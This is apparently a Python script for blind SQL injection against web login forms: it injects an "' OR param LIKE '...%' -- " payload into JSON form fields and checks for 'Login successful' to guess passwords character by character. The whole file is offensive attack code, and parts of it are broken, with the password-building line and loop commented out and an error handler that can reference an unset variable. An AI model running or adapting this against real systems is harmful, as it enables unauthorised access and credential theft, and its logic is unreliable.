import requests
import time
import logger

class TestPayloadException(Exception):
    pass

def test_payload(form, param, load, char):
    # Construct the payload for SQL injection
    payload = f"' OR {param} LIKE '{load + char}%' -- "  # Modify payload structure as needed
    headers = {'Content-Type': 'application/json'}
    
    payloads = {
        "basic": "a123",
        "name": "John Doe",
        "userName": "Asaf",
        "username": "admin",  # Assuming 'admin' is the username
        "user": "admin",  # Assuming 'admin' is the username
        "email": "johndoe@example.com",
        "password": "securepassword123"
    }
    
    url = form['url']
    
    new_object = {}

    for obj in form['body']:
        value = payloads.get(obj['name'], 'a12345678')
        if obj['name'] == param:
            value = payload
        new_object[obj['name']] = value

    # Send the POST request with a timeout
    try:
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status()  # Raise an exception for 4xx/5xx errors
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        if hasattr(response, 'status_code') and response.status_code == 500:
            raise TestPayloadException("Server returned status code 500")
        return False
    
    # Print the payload and response text for debugging
    if response.status_code == 200:
        print("Response text:", response.text)
        logger.log_response(response.text)
    
    # Check if the login was successful based on response text
    return "Login successful" in response.text

def blind(form):
    max_runtime = 60  
    max_attempts_per_char = 50  
    num_of_params = len(form['body'])
    
    for i in range(num_of_params):
        param_name = form['body'][i]['name']
        print(f"Trying to find password for parameter: {param_name}")
        
        if form['body'][i]['value'] != '':
            print(f"Skipping parameter {param_name} since it already has a value.")
            continue
        
        password = ""  # Initialize password for each parameter
        attempts = 0
        start_time = time.time()

        try:
            # Sequentially test characters with some randomness
            for starting_char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                char_found = False
                load = starting_char

                # while len(password) < max_password_length and (time.time() - start_time) < max_runtime:
                    # Test current character
                if test_payload(form, param_name, load, password):
                    # password += starting_char
                    print(f"Found character: {starting_char} | Current password: {password}")
                    char_found = True
                    continue
                
        except TestPayloadException as e:
            print(f"Error for parameter {param_name}: {e}")
            continue
        
        if (time.time() - start_time) >= max_runtime:
            print(f"Maximum runtime exceeded for parameter: {param_name}")
            break
